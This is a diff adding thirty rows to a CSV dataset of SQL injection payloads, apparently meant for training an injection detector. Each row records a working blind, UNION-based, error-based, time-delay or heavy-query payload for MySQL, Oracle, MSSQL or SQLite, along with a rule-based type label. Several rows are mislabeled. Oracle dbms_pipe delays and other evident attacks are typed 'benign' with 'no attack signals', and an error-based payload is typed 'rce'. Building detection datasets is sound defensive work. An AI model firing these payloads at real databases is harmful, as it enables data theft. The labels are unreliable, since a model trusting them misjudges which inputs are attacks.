@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+6300,-2303' ) ) as exyt where 2528 = 2528 or 8571 = 8571--,1,,boolean_blind,generic,0.95,2528 = 2528 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6301,"1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+6302,1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6303,"1"" ) as uyms where 6210 = 6210 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
+6304,1' where 6583 = 6583,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6305,"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""bnyh"" = ""bnyh",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6306,"-5210"" ) where 7176 = 7176 or 6872 = 6872--",1,,boolean_blind,generic,0.95,7176 = 7176 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6307,"1' ) ) and make_set ( 1002 = 3556,3556 ) and ( ( 'mfao' = 'mfao",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+6308,"-2583"" ) where 3455 = 3455 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,3455 = 3455 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6309,"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6310,select ( case when ( 9030 = 9185 ) then 9030 else 9030* ( select 9030 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6311,"1' ) ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6312,"1"" ) as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+6313,"1 ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6314,"1"" ) as boeh where 2571 = 2571 union all select null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6315,"1' ) union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6316,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6317,1'|| ( select 'bupa' from dual where 8548 = 8548,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6318,1' where 1844 = 1844,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6319,"1 ) as udjn where 6871 = 6871 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6320,1' ) as nftr where 8825 = 8825 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6321,"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'fgox' like 'fgox",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
+6322,"-1166' ) ) as icdz where 1042 = 1042 union all select 1042,1042,1042,1042,1042#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6323,"1' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6324,1 where 2672 = 2672 and 1819 = 4322#,1,,boolean_blind,generic,0.95,2672 = 2672 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6325,-5861' ) or 1581 = 2611 and ( 'mvjh' like 'mvjh,1,,boolean_blind,generic,0.95,"1581 = 2611 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
+6326,"1' in boolean mode ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) #",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6327,"select * from generate_series ( 3827,3827,case when ( 3827 = 7095 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
+6328,"-4865 where 1386 = 1386 union all select 1386,1386,1386,1386#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6329,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'yfvu' like 'yfvu,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
